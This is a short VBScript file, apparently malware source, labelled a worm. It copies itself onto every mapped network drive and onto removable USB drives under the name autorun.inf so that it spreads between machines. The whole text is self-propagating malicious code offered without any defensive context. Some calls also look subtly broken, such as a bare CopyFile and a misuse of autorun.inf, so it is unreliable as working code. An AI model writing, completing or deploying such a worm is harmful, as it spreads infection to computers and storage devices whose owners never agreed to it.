' VBScript worm
Set fso = CreateObject("Scripting.FileSystemObject")
Set network = CreateObject("WScript.Network")

' Spread via network shares
For Each drive In network.EnumNetworkDrives()
    If drive <> "" Then
        CopyFile "worm.vbs", drive & "\worm.vbs"
    End If
Next

' USB propagation
For Each drive In fso.Drives
    If drive.DriveType = 1 Then ' Removable drive
        CopyFile "worm.vbs", drive.Path & "\autorun.inf"
    End If
Next
